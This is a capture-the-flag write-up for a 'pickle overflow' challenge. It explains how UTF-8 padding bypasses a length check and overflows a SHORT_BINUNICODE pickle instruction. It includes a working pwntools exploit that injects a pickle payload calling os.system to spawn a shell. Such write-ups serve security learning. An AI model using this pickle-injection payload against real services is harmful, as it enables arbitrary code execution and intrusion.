# pickle overflow

![image](https://github.com/user-attachments/assets/3dc1386c-c94b-4e23-b8b9-489b08ea7dbe)

## solution

after leaking the 2nd line of the program by entering >256 chars as hinted in the description, it is possible to see that the input is being put into a `SHORT_BINUNICODE` pickle instruction. however, the length that is being checked is using a utf8 string

```py
inp = input()
assert (len(inp) < 256 and (__import__('pickle').loads(b'\x80\x04\x8c' + (lambda v: __import__('Crypto.Util.number',None,None,['Util','number']).long_to_bytes(len(v))+v)(inp.encode())+b'\x2e'))), "too big input!!!"
```

we can overflow the length by padding the end with emojis or some other utf8 char. however, there is the issue of escaping with the `inp.encode()` using utf8 by default. we can just copy paste the dicectf [unipickle](https://github.com/dicegang/dicectf-quals-2024-challenges/blob/main/misc/unipickle/unipickle.py) solution since that challenge is the exact same pretty much.

```py
from pwn import *
from pickle import *

p = process(["python3", "main.py"])

# payload can be stolen from dicectf 2024 unipickle, but unipickle isn't the main focus
# the main point of the challenge is to add a bunch of stuff to overflow SHORT_BINUNICODE length argument, and also to bypass the length check we can pad the payload with unicode chars where len(c) == 1 and len(c.encode()) > 1

bs = lambda _: SHORT_BINSTRING + int.to_bytes(len(_), 1, 'big') + b"" + _.encode() + b""

q = (bs('os') + bs('system') + BINPUT + b'\xc7\x88' + POP + POP + BINGET + b'\xc7\x93' + MARK + bs('sh') + TUPLE + REDUCE + STOP)

p.sendline(q + b'\xd2\x82' * 160)

p.interactive()
```
